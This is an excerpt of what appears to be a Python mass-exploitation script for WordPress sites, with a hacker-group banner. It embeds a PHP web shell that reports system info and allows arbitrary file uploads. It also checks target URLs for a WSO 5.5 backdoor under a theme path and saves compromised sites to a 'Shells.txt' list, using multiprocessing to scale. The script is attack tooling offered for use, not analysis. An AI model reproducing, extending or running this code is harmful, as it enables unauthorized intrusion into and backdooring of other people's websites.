...
print (Fore.RED + """  
___________         __      __          
\_   _____/___  ___/  \    /  \______   
 |    __)_ \  \/  /\   \/\/   /\____ \  
 |        \ >    <  \        / |  |_> > 
/_______  //__/\_ \  \__/\  /  |   __/  
        \/       \/       \/   |__|     
 [+] Developed by Ph.Sk1d
                                        
    """.format(fr, fw, fg, fr, fg, fr, fg, fr, fg, fr, fr, fg))

shell = """<?php echo "MindanaoCyberArmy"; echo "<br>".php_uname()."<br>"; echo "<form method='post' enctype='multipart/form-data'> <input type='file' name='zb'><input type='submit' name='upload' value='upload'></form>"; if($_POST['upload']) { if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) { echo "eXploiting Done"; } else { echo "Failed to Upload."; } } ?>"""
...
def FourHundredThree(url):
    try:
        ...
        if " - WSO 5.5</title>" in check.content:
            ...
            check = requests.get(url+'/wp-content/themes/mero-magazine/ws.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if " - WSO 5.5</title>" in check.content:
                    print(Fore.GREEN + '[+]' + url + ('--> {}[Success').format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-content/themes/mero-magazine/ws.php\n')
            else:
                print(Fore.GREEN + "[+]" + url + ('>{}[Failed]').format(fr))
    except :
        print(Fore.GREEN + url + ('>{}[Failed]').format(fr))
...
mp.close()
mp.join()
print ('\n {}Shelled websites aved in shells.txt').format(fw)